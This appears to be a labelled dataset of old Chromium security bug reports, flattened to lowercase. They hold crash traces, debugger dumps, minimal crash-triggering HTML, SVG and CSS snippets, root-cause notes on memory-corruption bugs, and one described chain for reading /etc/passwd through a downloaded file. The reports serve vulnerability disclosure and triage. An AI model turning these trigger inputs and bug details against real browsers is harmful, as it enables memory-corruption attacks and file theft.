browser crash in incognito mode with trying to close a large db found in my layouttest fuzzing run chrome in incognito mode or normal mode incognito window reproduces 1 in 5-10 times outside debugger but consistently inside debugger using following options complete browser crash needs analysis on severity there could be memory corruption with overwriting of already closed handles d chromium\src\chrome\release c program files x86 debugging tools for windows x86 cdb.exe chrome.exe incognito reduced testcase script function runtest try var db opendatabase overquotaopen 10000000 catch err script body onload runtest 1498.d48 invalid handle code c0000008 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000000 ebx=01032570 ecx=00000004 edx=00000000 esi=00000780 edi=041aaf68 eip=777204a2 esp=03c7f794 ebp=03c7f7a0 iopl=0 nv up ei pl nz na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206 ntdll zwclose 777204a2 c20400 ret 4 0:007 exr 1 exceptionaddress 775a5a77 exceptioncode c0000008 invalid handle exceptionflags 00000000 numberparameters 0 thread tried to close a handle that was invalid or illegal to close 0:007 kp childebp retaddr warning stack unwind information not available following frames may be wrong 03c7f7a0 66dd469b ntdll zwclose 03c7f7a8 6774e632 chrome_66c90000 base closeplatformfile void file 03c7f85c 671e2eb4 chrome_66c90000 webkit_database databasetracker closeincogni tofilehandle class std basic_string wchar_t std char_traits wchar_t std allocator wchar_t vfs_file_name 03c7f934 671e2174 chrome_66c90000 databasedispatcherhost databasedeletefile class std basic_string wchar_t std char_traits wchar_t std allocator wchar_t vfs_file_name bool sync_dir true class ipc message reply_msg int reschedule_count 0 03c7f950 66db94cf chrome_66c90000 runnablemethod databasedispatcherhost void vo id 03c7fa04 66db957b chrome_66c90000 messageloop runtask class task task 03c7fa0c 66db9912 chrome_66c90000 messageloop deferorrunpendingtask struct messageloop pendingtask pending_task 8ec 03c7fa40 66dd64f2 chrome_66c90000 messageloop dodelayedwork class base time next_delayed_work_time 03c7fa74 66dd6382 chrome_66c90000 base messagepumpforui dorunloop void 03c7fa90 66db9c42 chrome_66c90000 base messagepumpwin run class base messagepump delegate delegate d 03c7fb30 66dbaabb chrome_66c90000 messageloop runinternal void 03c7fb48 67c55729 chrome_66c90000 messageloop run void 03c7fb4c 67c55ac8 chrome_66c90000 base thread run class messageloop message_loop 03c7fc80 66dbec0b chrome_66c90000 base thread threadmain void error symbol file could not be found defaulted to export symbols for c w indows\syswow64\kernel32.dll 03c7fc84 76e7e4a5 chrome_66c90000 anonymous namespace threadfunc void closure 03c7fc90 7777cfed kernel32 basethreadinitthunk 03c7fcd0 7777d1ff ntdll rtlcreateuserprocess 03c7fce8 00000000 ntdll rtlcreateprocessparameters	11
browser crash creating unlimited number of file dialogs by running the attached example test9.html you are able to create unlimited number of file select dialogs for file inputs the browser starts not to respond you ca n't close the tab the browser no nothing one of chrome processes uses 99 of processor the whole system slows down after a while when you have more than a hundred of file dialogs opened see attached chrome-127-dialogs.jpg the browser crashes see chrome-crash.jpg normally you can create only 1 file select dialog but by using a window.open trick i am able to create 26 of them some kind of popup blocker limit by using another trick that closes those windows that have already opened a dialog i am no more limited the old dialogs are not closed along with the windows some of them are but not all chrome version 6.0.472.63 stable operating system windows xp sp3 type of crash browser cheers cezary	2
use after free when encountering history.back call during page gotoitem execution chrome version 8.0.558.0 developer build 62906 winxp urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 firefox 3.x ie 7 ie 8 what steps will reproduce the problem 1 go to the url 2 click konfigurator passat variant 3 in the new window click comfort 4 do a history back with the back key on your keyboard what is the expected result goes back what happens instead aw snap on the popup and normal window	11
security add html and htm to the dangerous extensions list for osx and os_posix this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details 1 user browses to an evil page the evil page serves back a response with content-disposition attachment for a file with a html extension 2 the content-disposition attachment forces the download dialog to appear with the attacker controlled file appearing in the download dialog 3 if the user clicks the file name in the download dialog the html file loads and downloads a swf file to the downloads directory the cwd xmlhttp seems to be neutered otherwise there would be no need to download the swf 4 using a settimeout i delay the loading of the swf until after its fully downloaded 5 seconds once the swf is downloaded i load the swf file which grabs the contents of etc/passwd and displays the contents of the file to the screen 5 i have n't coded this piece in but the next step would be to pass the file contents back to the browser from the swf file via the externalinterface api and have the browser ferry it out via javascript i do n't think this step if necessary to demonstrate the issue but it might be fun to code up poc here bkr/no_crawl/pwn/chrome/nix/plantit.html version chrome version 7.0.517.41 beta operating system ubuntu 8.04 reproduction case repro can be found here bkr/no_crawl/pwn/chrome/nix/plantit.html for crashes please include the following additional information type of crash n/a crash state n/a client id if relevant n/a	2
security google chrome crashes when a request passes through a proxy and recieves a 407 http error code from the server vulnerability details any server may host a page returning 407 proxy authentication required and cause a google chrome crash on client side i m not expert in exploiting these vulnerabilities but may be this is exploitable in a more dangerous manner version chrome version 7.0.517.41 stable operating system windows xp sp3 linux reproduction case the bug can be reproduced in this manner 1 an outgoing anonymous proxy not using authentication has to be configured in chrome 2 go to a server that responds with a 407 proxy authentication required page here is an example you have permission to go to this page but please use with caution for now i was not able to reproduce it on a http page it seems to happen only on https pages type of crash browser crash state see attached dump file ans screenshot obtained with windbg.exe client id if relevant abea0f66-899e-43f8-9d28-62408978139a please do not hesitate to ask me more questions/information if needed best regards mohamed bouhlel mbouhlel denyall.com mohammed.bouhlel gmail.com tel 33 0 1 40 07 47 23 fax 33 0 1 40 07 47 27 deny all 23 rue notre dame des victoires 75002 paris france www.denyall.com	1
msvr-10-0108 integer overflow in chrome s vp8 decoding leads to memory corruption the following software vulnerability report is highly confidential and should be limited in distribution to members of the engineering team within your organization with need-to-know for performance of security risk analysis and remediation we ask you to please direct all communications through msvr microsoft.com for business and legal continuity purposes and not to the individual finder or other contacts you may have at microsoft corporation vulnerability details reproduction is available but exceeds the 10mb limit here if repro is required i can provide a spot to download it from this issues is likely to exist in other platforms which utilize the ffmpeg based vp8 decoder root cause analysis this issue is caused by an unsafe arithmetic operation on a destination pointer to a memset call which results in memory corruption write to the address to resolve this issue a standard integer safe library or specific integer safe checks can be used the following debugging sequence illustrates the crux of the issue 0:007 r eax=00000000 ebx=05f8831c ecx=05f850ec edx=00000001 esi=05f83fe0 edi=00000000 eip=61dc0112 esp=088ff5b0 ebp=088ff5c8 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 avcodec_52 vp8_setup_intra_recon 61dc0112 2b4308 sub eax dword ptr ebx+8 ds:0023:05f88324=00000001 unsafe subtraction leads to integer overflow of an eventual destination pointer 0:007 r eax=ffffffff ebx=05f8831c ecx=05f850ec edx=00000001 esi=05f83fe0 edi=00000000 eip=61dc0115 esp=088ff5b0 ebp=088ff5c8 iopl=0 nv up ei ng nz ac pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000297 eax is now avcodec_52 vp8_setup_intra_recon 61dc0115 83c205 add edx,5 0:007 r eax=ffffffff ebx=05f8831c ecx=05f850ec edx=00000006 esi=05f83fe0 edi=00000000 eip=61dc0124 esp=088ff5b0 ebp=088ff5c8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 avcodec_52 vp8_setup_intra_recon 61dc0124 890424 mov dword ptr esp eax ss:0023:088ff5b0=00000040 bogus pointer is moved to the stack as argument to a memset call 0:007 r eax=ffffffff ebx=05f8831c ecx=05f850ec edx=00000006 esi=05f83fe0 edi=00000000 eip=61dc0127 esp=088ff5b0 ebp=088ff5c8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 avcodec_52 vp8_setup_intra_recon 61dc0127 e8c4220200 call avcodec_52 pthread_rwlock_timedwrlock 61de23f0 0:007 dds esp l3 088ff5b0 ffffffff bogus pointer 088ff5b4 0000007f 088ff5b8 00000006 0:007 kp childebp retaddr 088ff5a8 61dc012c msvcrt memset unsigned char dst memory read error at address unsigned char value unsigned long count 6 088ff5c8 61db1786 avcodec_52 vp8_setup_intra_recon 088ff738 61daa722 avcodec_52 vp8_decode_frame 088ff7c8 61da9c06 avcodec_52 vp8dx_receive_compressed_data 088ff878 61daa11d avcodec_52 ff_split_xiph_headers 088ff8a8 61d35633 avcodec_52 vpx_codec_decode 088ff8e8 61d5e5a2 avcodec_52 j_rev_dct1 088ff918 02d1ab4e avcodec_52 avcodec_decode_video2 088ffa44 02d1aa40 chrome_25a0000 media ffmpegvideodecodeengine decodeframe class scoped_refptr media buffer buffer class scoped_refptr media buffer d b\slave\chrome-official\build\src\media\video\ffmpeg_video_decode_engine.cc 209 088ffa54 02d14f79 chrome_25a0000 media ffmpegvideodecodeengine consumevideosample class scoped_refptr media buffer buffer class scoped_refptr media buffer d b\slave\chrome-official\build\src\media\video\ffmpeg_video_decode_engine.cc 163 088ffa74 02d14739 chrome_25a0000 media ffmpegvideodecoder onreadcompletetask class scoped_refptr media buffer buffer class scoped_refptr media buffer d b\slave\chrome-official\build\src\media\filters\ffmpeg_video_decoder.cc 288 088ffa88 02662a8c chrome_25a0000 runnablemethod media decoderbase media audiodecoder media buffer void void d b\slave\chrome-official\build\src\base\task.h 328 088ffab8 02662b18 chrome_25a0000 messageloop runtask class task task d b\slave\chrome-official\build\src\base\message_loop.cc 409 088ffac8 02662cae chrome_25a0000 messageloop deferorrunpendingtask struct messageloop pendingtask pending_task d b\slave\chrome-official\build\src\base\message_loop.cc 420 088ffaf8 02676c5a chrome_25a0000 messageloop dowork void d b\slave\chrome-official\build\src\base\message_loop.cc 524 088ffb24 00000000 chrome_25a0000 base messagepumpdefault run class base messagepump delegate delegate memory access error d b\slave\chrome-official\build\src\base\message_pump_default.cc 50 we 7f write to a bogus pointer 0:007 g 1dac.1c70 access violation code c0000005 first/second chance not available first chance exceptions are reported before any exception handling this exception may be expected and handled time travel position 3824340000001 eax=0000007f ebx=05f8831c ecx=00000001 edx=00000005 esi=05f83fe0 edi=ffffffff eip=75c59dae esp=088ff5a8 ebp=088ff5c8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 msvcrt memset 75c59dae 8807 mov byte ptr edi al ds:0023 ffffffff chrome version information 0:007 lmv m chrome_25a0000 start end module name 025a0000 03a69000 chrome_25a0000 loaded symbol image file chrome.dll mapped memory image file c xxx\chrome.dll image path c users\xxx\appdata\local\google\chrome\application\7.0.517.41\chrome.dll image name chrome.dll timestamp mon oct 11 21:39:55 2010 4cb3e69b checksum 014329c5 imagesize 014c9000 file version 7.0.517.41 product version 7.0.517.41 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 7.0.517.41 latest chrome fileversion 7.0.517.41 filedescription google chrome legalcopyright copyright c 2006-2009 google inc all rights reserved 0:007 lmv m avcodec_52 start end module name 61cc0000 61f17000 avcodec_52 export symbols avcodec-52.dll loaded symbol image file avcodec-52.dll mapped memory image file c users\xxx\appdata\local\google\chrome\application\7.0.517.41\avcodec-52.dll image path c users\xxx\appdata\local\google\chrome\application\7.0.517.41\avcodec-52.dll image name avcodec-52.dll timestamp fri sep 03 19:13:39 2010 4c81ab53 checksum 00167ccb imagesize 00257000 translations 0000.04b0 0000.04e4 0409.04b0 0409.04e4 credit for this report should go to david weston of microsoft and microsoft vulnerability research msvr	7
faulty webm file causes segfault vulnerability details memory corruption resulting from malformed webm video file the crash is a little different depending on whether user-dir has been wiped before launching the page or if the video is being watched a second time or if it is relaunched after the sad tab appears sometimes the video can be watched up to 3 times before the sad tab appears version chrome version chromium 9.0.573.0 ubuntu 10.10 operating system linux 2.6.35-23-generic 36-ubuntu smp tue oct 26 17:13:06 utc 2010 x86_64 gnu/linux chrome version chromium 7.0.517.44 ubuntu 10.10 operating system linux 2.6.35-23-generic 36-ubuntu smp tue oct 26 17:13:06 utc 2010 x86_64 gnu/linux chrome version 7.0.517.44 operating system windows xp reproduction case sample html video src='report.webm autoplay video video file attached i was n't able to make it smaller yet for crashes please include the following additional information type of crash sad tab crash state sample dmesg output nov 5 22:29:51 kernel 35737.126312 chromium-browse 30664 segfault at 7f5201269348 ip 00007f5201269348 sp 00007f51ef54c908 error 15 nov 5 22:30:13 kernel 35758.982369 chromium-browse 30742 segfault at 0 ip null sp 00007ff18f4b3908 error 14 nov 5 22:36:19 kernel 36125.082911 chromium-browse 31029 segfault at 7f950a174bb0 ip 00007f950a174bb0 sp 00007f94f81db908 error 15 nov 5 22:36:37 kernel 36142.251213 chromium-browse 31080 segfault at 7f5ba8111bb0 ip 00007f5ba8111bb0 sp 00007f5b97b08908 error 15 nov 5 22:36:39 kernel 36144.991586 chromium-browse 31123 segfault at 7f5445ef1bb0 ip 00007f5445ef1bb0 sp 00007f5435c43908 error 15 nov 5 22:36:42 kernel 36147.090493 chromium-browse 31166 segfault at 7faa0cf8bbb0 ip 00007faa0cf8bbb0 sp 00007fa9fb080908 error 15 nov 5 22:36:46 kernel 36151.521066 chromium-browse 31209 segfault at 7f96e63eda50 ip 00007f96e63eda50 sp 00007f96d43b4908 error 15 nov 5 22:36:48 kernel 36153.596988 chromium-browse 31253 segfault at 7f10152e8bb0 ip 00007f10152e8bb0 sp 00007f10041d2908 error 15 nov 5 22:36:50 kernel 36155.454062 chromium-browse 31296 segfault at 7f080b918bb0 ip 00007f080b918bb0 sp 00007f07f9f3b908 error 15 nov 5 22:36:52 kernel 36157.729186 chromium-browse 31341 segfault at 7f61ff306bb0 ip 00007f61ff306bb0 sp 00007f61edd1c908 error 15 nov 5 22:36:57 kernel 36162.517231 chromium-browse 31385 segfault at 7f0c4c3ccbb0 ip 00007f0c4c3ccbb0 sp 00007f0c3bc8b908 error 15 nov 5 22:36:59 kernel 36164.519176 chromium-browse 31429 segfault at 7fd285ba1bb0 ip 00007fd285ba1bb0 sp 00007fd2757f4908 error 15 nov 5 22:37:01 kernel 36166.325317 chromium-browse 31472 segfault at 7f2d4a458bb0 ip 00007f2d4a458bb0 sp 00007f2d39e89908 error 15 nov 5 22:37:03 kernel 36168.302528 chromium-browse 31515 segfault at 7f30478afbb0 ip 00007f30478afbb0 sp 00007f3037238908 error 15 nov 5 22:53:38 kernel 37161.319572 chromium-browse 602 segfault at 7fa2a9e92bb0 ip 00007fa2a9e92bb0 sp 00007fa299472908 error 15 nov 5 22:53:42 kernel 37164.791188 chromium-browse 648 segfault at 8 ip 00007f72318ff3ec sp 00007f7224300780 error 4 in chromium-browser 7f7230ea0000+2fc6000 nov 5 22:53:46 kernel 37168.803901 chromium-browse 696 segfault at 7fad431cfbb0 ip 00007fad431cfbb0 sp 00007fad32968908 error 15 nov 5 22:53:49 kernel 37172.178351 chromium-browse 739 segfault at 7f046300cbb0 ip 00007f046300cbb0 sp 00007f04526f4908 error 15 nov 5 22:53:53 kernel 37175.962026 chromium-browse 783 segfault at 7f76ac8a6bb0 ip 00007f76ac8a6bb0 sp 00007f769bff8908 error 15 nov 5 22:53:56 kernel 37178.759798 chromium-browse 827 segfault at 7f65e9860bb0 ip 00007f65e9860bb0 sp 00007f65d9439908 error 15 nov 5 22:53:58 kernel 37181.635247 chromium-browse 871 segfault at 7f2591d2dbb0 ip 00007f2591d2dbb0 sp 00007f2580e82908 error 15 nov 5 22:54:01 kernel 37184.681261 chromium-browse 916 segfault at 7fa485aefbb0 ip 00007fa485aefbb0 sp 00007fa473ab8908 error 15 nov 5 22:54:05 kernel 37187.728179 chromium-browse 959 segfault at 7f146a0cdbb0 ip 00007f146a0cdbb0 sp 00007f1459452908 error 15 nov 5 22:54:15 kernel 37198.542456 chromium-browse 1017 segfault at 7f51abb584d0 ip 00007f51abb584d0 sp 00007f5199891908 error 15 nov 5 22:54:23 kernel 37206.358088 chromium-browse 1069 segfault at 7fc76e0d0a50 ip 00007fc76e0d0a50 sp 00007fc75c9ed908 error 15 nov 5 22:55:24 kernel 37266.747989 chromium-browse 1090 segfault at 38 ip 00007fc76a726e67 sp 00007fc75c1ec910 error 4 in chromium-browser 7fc76958d000+2fc6000 first run with g single-process program received signal sigsegv segmentation fault switching to thread lwp 387 in gdb bt 0 in 1 in media ffmpegdemuxer demuxtask this at media/filters/ffmpeg_demuxer.cc:544 2 in messageloop runtask this task at base/message_loop.cc:417 3 in messageloop deferorrunpendingtask this pending_task value optimized out at base/message_loop.cc:426 4 in messageloop dowork this at base/message_loop.cc:533 5 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 6 in runhandler this at base/message_loop.cc:237 7 messageloop run this at base/message_loop.cc:215 8 in base thread threadmain this at base/thread.cc:164 9 in threadfunc closure at base/platform_thread_posix.cc:35 10 in start_thread from lib/libpthread.so.0 11 in clone from lib/libc.so.6 12 in gdb i r rax 140737369905232 rbx 140737370977552 rcx 0 rdx 2 rsi 140737375383872 rdi 140737369837984 rbp rsp r8 0 r9 1 r10 0 r11 0 r12 140737369837984 r13 140736872188560 r14 1 r15 140736872188976 rip eflags pf zf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb disas no function contains program counter for selected frame gdb disas dump of assembler code for function media ffmpegdemuxer demuxtask 0 mov rbx rsp 5 mov rbp rsp 10 mov rdi rbx 13 mov r12 rsp 18 sub rsp 22 callq media ffmpegdemuxer streamshavependingreads 27 test al al 29 jne media ffmpegdemuxer demuxtask 56 31 mov rsp rbx 35 mov rsp rbp 40 mov rsp r12 45 add rsp 49 retq 50 jmp media ffmpegdemuxer demuxtask 56 52 nop 53 nop 54 nop 55 nop 56 mov edi 61 callq tc_new size_t 66 mov rax rbp 69 mov ecx 74 xor eax eax 76 mov rbp rdi 79 mov rbp rsi 82 rep stos rax es rdi 85 mov rbx rdi 89 callq av_read_frame avformatcontext avpacket 94 test eax eax 96 js media ffmpegdemuxer demuxtask 208 98 movslq rbp rdx 102 mov rbx rax 106 mov rax rdx,8 r12 110 test r12 r12 113 je media ffmpegdemuxer demuxtask 138 115 mov rbp rdi 118 callq av_dup_packet avpacket 123 mov r12 rax 127 mov rbp rsi 130 xor ebp ebp 132 mov r12 rdi 135 callq rax 138 mov rbx rdi 141 callq media ffmpegdemuxer streamshavependingreads 146 test al al 148 jne media ffmpegdemuxer demuxtask 192 150 mov rbp rdi 153 callq av_free_packet avpacket 158 mov rbp rdi 161 mov rsp rbx 165 mov rsp rbp 170 mov rsp r12 175 add rsp 179 jmpq tc_delete void 184 jmp media ffmpegdemuxer demuxtask 192 186 nop 187 nop 188 nop 189 nop 190 nop 191 nop 192 mov rbx rax 195 mov rbx rdi 198 callq rax 204 jmp media ffmpegdemuxer demuxtask 150 206 xchg ax ax 208 mov rbx rdi 211 callq media ffmpegdemuxer streamhasended 216 jmp media ffmpegdemuxer demuxtask 150 end of assembler dump gdb second run program received signal sigsegv segmentation fault switching to thread lwp 429 media ffmpegdemuxer demuxtask this at media/filters/ffmpeg_demuxer.cc:544 544 media/filters/ffmpeg_demuxer.cc no such file or directory in media/filters/ffmpeg_demuxer.cc gdb bt 0 media ffmpegdemuxer demuxtask this at media/filters/ffmpeg_demuxer.cc:544 1 in messageloop runtask this task at base/message_loop.cc:417 2 in messageloop deferorrunpendingtask this pending_task value optimized out at base/message_loop.cc:426 3 in messageloop dowork this at base/message_loop.cc:533 4 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 5 in runhandler this at base/message_loop.cc:237 6 messageloop run this at base/message_loop.cc:215 7 in base thread threadmain this at base/thread.cc:164 8 in threadfunc closure at base/platform_thread_posix.cc:35 9 in start_thread from lib/libpthread.so.0 10 in clone from lib/libc.so.6 11 in gdb disas dump of assembler code for function media ffmpegdemuxer demuxtask 0 mov rbx rsp 5 mov rbp rsp 10 mov rdi rbx 13 mov r12 rsp 18 sub rsp 22 callq media ffmpegdemuxer streamshavependingreads 27 test al al 29 jne media ffmpegdemuxer demuxtask 56 31 mov rsp rbx 35 mov rsp rbp 40 mov rsp r12 45 add rsp 49 retq 50 jmp media ffmpegdemuxer demuxtask 56 52 nop 53 nop 54 nop 55 nop 56 mov edi 61 callq tc_new size_t 66 mov rax rbp 69 mov ecx 74 xor eax eax 76 mov rbp rdi 79 mov rbp rsi 82 rep stos rax es rdi 85 mov rbx rdi 89 callq av_read_frame avformatcontext avpacket 94 test eax eax 96 js media ffmpegdemuxer demuxtask 208 98 movslq rbp rdx 102 mov rbx rax 106 mov rax rdx,8 r12 110 test r12 r12 113 je media ffmpegdemuxer demuxtask 138 115 mov rbp rdi 118 callq av_dup_packet avpacket 123 mov r12 rax 127 mov rbp rsi 130 xor ebp ebp 132 mov r12 rdi 135 callq rax 138 mov rbx rdi 141 callq media ffmpegdemuxer streamshavependingreads 146 test al al 148 jne media ffmpegdemuxer demuxtask 192 150 mov rbp rdi 153 callq av_free_packet avpacket 158 mov rbp rdi 161 mov rsp rbx 165 mov rsp rbp type return to continue or q return to quit 170 mov rsp r12 175 add rsp 179 jmpq tc_delete void 184 jmp media ffmpegdemuxer demuxtask 192 186 nop 187 nop 188 nop 189 nop 190 nop 191 nop 192 mov rbx rax 195 mov rbx rdi 198 callq rax 204 jmp media ffmpegdemuxer demuxtask 150 206 xchg ax ax 208 mov rbx rdi 211 callq media ffmpegdemuxer streamhasended 216 jmp media ffmpegdemuxer demuxtask 150 end of assembler dump gdb i r rax 0 rbx 140737370998320 rcx 0 rdx 2 rsi 0 rdi 140737375201152 rbp rsp r8 0 r9 1 r10 0 r11 0 r12 129142929842773 r13 140736867961488 r14 1 r15 140736867961904 rip media ffmpegdemuxer demuxtask 123 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb ffmpeg_demuxer.cc 536 if packet.get 537 if a packet is returned by ffmpeg s av_parser_parse2 538 the packet will reference an inner memory of ffmpeg 539 in this case the packet s destruct member is null 540 and it must be duplicated this fixes issue with mp3 and possibly 541 other codecs it is safe to call this function even if the packet does 542 not refer to inner memory from ffmpeg 543 av_dup_packet packet.get 544 demuxer_stream enqueuepacket packet.release 545 546	9
bad cast in webdevtoolsfrontendimpl dispatchoninspectorfrontend test chrome 9.0.570.1 dev windows xp sp3	2
crash in webcore smiltimecontainer begin crashes on linux 32-bit dev 9.0.570.1 developer build 64589 and stable 7.0.517.44 oficjalna wersja 64615 program received signal sigsegv segmentation fault switching to thread lwp 8205 in 0 in 1 in webcore smiltimecontainer updateanimations this elapsed static unresolvedvalue 1,7976931348623157e+308 static indefinitevalue 3,4028234663852886e+38 m_time 0 at third_party/webkit/webcore/svg/animation/smiltimecontainer.cpp:308 2 in webcore smiltimecontainer begin this at third_party/webkit/webcore/svg/animation/smiltimecontainer.cpp:103 3 in webcore svgdocumentextensions startanimations this at third_party/webkit/webcore/svg/svgdocumentextensions.cpp:98 4 in webcore document implicitclose this at third_party/webkit/webcore/dom/document.cpp:2083 5 in webcore frameloader checkcallimplicitclose this at third_party/webkit/webcore/loader/frameloader.cpp:902 6 in webcore frameloader checkcompleted this at third_party/webkit/webcore/loader/frameloader.cpp:850 7 in webcore frameloader finishedparsing this at third_party/webkit/webcore/loader/frameloader.cpp:784 8 in webcore document finishedparsing this at third_party/webkit/webcore/dom/document.cpp:4154 repro file crash1.xml html xmlns body svg version 1.1 xmlns xmlns xlink text textpath tref xlink href foo animatecolor attributename keypoints animatecolor animatecolor attributename xlink href animatecolor tref textpath text svg body html if it does n't crash instantly try to refresh few times registers eax 54193664 ecx 0 edx 54192768 ebx 47111204 esp ebp esi 2 edi 8 eip 0 eflags if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 full backtrace attached bt1.txt in one of cases with bigger repro file i got that backtrace program received signal sigsegv segmentation fault switching to thread lwp 6859 in 0 in 1 in webcore smiltimecontainer begin this at third_party/webkit/webcore/svg/animation/smiltimecontainer.cpp:103 2 in webcore svgdocumentextensions startanimations this at third_party/webkit/webcore/svg/svgdocumentextensions.cpp:98 3 in webcore document implicitclose this at third_party/webkit/webcore/dom/document.cpp:2083 4 in webcore frameloader checkcallimplicitclose this at third_party/webkit/webcore/loader/frameloader.cpp:902 5 in webcore frameloader checkcompleted this at third_party/webkit/webcore/loader/frameloader.cpp:850 6 in webcore frameloader finishedparsing this at third_party/webkit/webcore/loader/frameloader.cpp:784 i attached full backtrace of this case as bt2.txt i ll try to put simple repro file later it think it can be exploitable	11
chrome_6dc70000 webcore eventhandler updateselectionformousedrag use after free test chrome 9.0.576.0 dev windows xp sp3 1 press ctrl+shift+j open devtools 2 type scan 1 press enter 3 type s then use mouse drag at the end line and move mouse left and right 4 3 video logout 53c.97c access violation code c0000005 second chance eax=0528c8b8 ebx=024ef568 ecx=0528c874 edx=0042f4ec esi=6ed1fe38 edi=0042f43c eip=00000000 esp=0042f434 ebp=0042f514 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 00000000 0:000 exr 1 exceptionaddress 73c2c9f1 exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000008 parameter 1 00000000 attempt to execute non-executable address 00000000	11
security possible memory corruption double-free in xpath processing code steps to reproduce 1 put the attached files demo.xml and demo.xsl in the same directory of the web server 2 load demo.xml in the browser via an url like 3 if the renderer does n't crash immediately reload the page a few times this will result in a sad tab the crash has been reproduced with the following combinations chrome 7.0.517.44 windows xp sp3 chromium 9.0.584.0 66236 windows xp sp3 chromium 9.0.584.0 66239 ubuntu 10.04 lts vulnerability details note due to network traffic limitations imposed by my university it s impractical for me to check out the entire chromium source tree and debug with it all of my debugging has been done with libxml2 2.7.8 so the following analysis should only be regarded as a guidance for locating the actual bug in the version of libxml2 as used by chrome however it s quite possible that the description applies to both versions without much difference it seems the issue exists in function xmlxpathcompopevalpositionalpredicate of xpath.c upon encountering input expression book evil 0 this function is called to evaluate predicate expression evil since evil is an illegal xpath function a further call to xmlxpathcompopevaltoboolean would return with an error and the engine moves into error handling code then comes the interesting part starting from line 11764 of xpath.c if ctxt error xpath_expression_ok res 1 xmlxpathobjectptr tmp pop the result tmp valuepop ctxt xmlxpathreleaseobject xpctxt tmp then pop off contextobj which will be freed later valuepop ctxt goto evaluation_error here an xpath object is popped from the value stack and released by xmlxpathreleaseobject then the control moves to evaluation_error starting from line 11835 of xpath.c evaluation_error xmlxpathnodesetclear set hasnsnodes newcontextsize 0 evaluation_exit if contextobj null if ctxt value contextobj valuepop ctxt xmlxpathreleaseobject xpctxt contextobj here contextobj is not null so xmlxpathreleaseobject is called again on contextobj which refers to the same object as the aforementioned block variable tmp in this particular scenario this will cause the call to xmlfree by xmlxpathreleaseobject to operate on an area of already freed memory leading to memory corruption version chrome 7.0.517.44 windows xp sp3 chromium 9.0.584.0 66236 windows xp sp3 chromium 9.0.584.0 66239 ubuntu 10.04 lts reproduction case please see the attached files demo.xml and demo.xsl	7
crash in pickle readint in net httpresponseinfo initfrompickle we ve had mysterious 64-bit only crashes in pickle readint for a while now but with 64-bit breakpad working we can now actually see the stacktrace product version chrome_linux 7.0.517.8 ptype browser cpu architecture amd64 lsb-release ubuntu 10.04.1 lts sample crash thread 8 crashed sigsegv chrome base/pickle.cc:111 pickle readint chrome net/http/http_response_info.cc:113 net httpresponseinfo initfrompickle chrome net/http/http_cache.cc:368 net httpcache parseresponseinfo chrome net/http/http_cache_transaction.cc:1056 net httpcache transaction docachereadresponsecomplete chrome net/http/http_cache_transaction.cc:511 net httpcache transaction doloop chrome base/callback.h:84 disk_cache inflightbackendio onoperationcomplete chrome net/disk_cache/in_flight_io.cc:64 disk_cache inflightio invokecallback chrome base/message_loop.cc:408 messageloop runtask chrome base/message_loop.cc:417 messageloop deferorrunpendingtask chrome base/message_loop.cc:524 messageloop dowork chrome base/message_pump_libevent.cc:270 base messagepumplibevent run chrome base/message_loop.cc:206 messageloop run chrome base/thread.cc:164 base thread threadmain chrome base/platform_thread_posix.cc:35 threadfunc looks like we re reading some cache file off the disk and crashing at some random address this looks like the type of stuff cevans is interested in but we need to figure out how to repro first	11
chrome_1c30000 tabcontents removeinfobar class infobardelegate delegate tab crash tested 8.0.552.11 dev windows xp sp3 while install and theme with close tab trigger the crash	11
security segfault when dealing with web workers and messagechannels vulnerability details given a messagechannel if one of its ports is sent to a web worker and the other is sent through a different local messagechannel attempting to call postmessage on the second port causes a segfault version chrome version chrome 9.0.576.0 dev chromium 7.0.517.44 stable ubuntu package operating system ubuntu 10.04 goobuntu reproduction case see attached file port_test.html note that this must be run from a server since file urls do n't have access to web workers running from localhost works for crashes please include the following additional information type of crash browser crash state see attached file gdb-chromium.txt	11
webkit css font face parsing type confusion vulnerability details the css parser internally stores a cssparservaluelist which contains a vector of cssparservalue structures the cssparservalue structure contains a union within that union is a double an integer a cssparserstring structure and a pointer to a cssparserfunction object depending on the type of css value parsed a different member of this union will be used in the case of my poc the double fvalue holds the value specified in the local css selector the structure during runtime just before crash gdb print a 9 id 0 isint true fvalue 2097153 ivalue 2147483648 string characters length 1094713344 function unit 1 gdb x/8x a this sets the string characters pointer to while string length is 1094713344 because fvalue is stored over 2 32bit dwords coincidentally on line 3638 of cssparser.cpp the unit type of the value is never checked and the string operator is invoked on this structure and because string characters is not null it attempts to allocate string length 2 for the new string that will be read from the value of fvalue directly controls where the string is read from in memory string characters but not where its written to for this example above the allocator will fail when trying to allocate 2gb of memory due to the length multiplication in stringimpl create a 32bit process will abort a 64bit process should succeed in the allocation but probably crash in a subsequent memcpy when attempting to read from an unmapped page above string characters version chrome version tested on chrome 7.0.517.44 and chrome 8.0.552.200 beta operating system win7 32bit ubuntu 10.10 32bit reproduction case html body h1 id=1 style src local 2097153 body html type of crash tab crash state stack trace of chrome 8.0.552.200 on win7 32bit 41400000 683a7c50 002ed56c chrome_68390000 anonymous namespace onnomemory void c b\slave\chrome-official\build\src\chrome\app\chrome_dll_main.cc 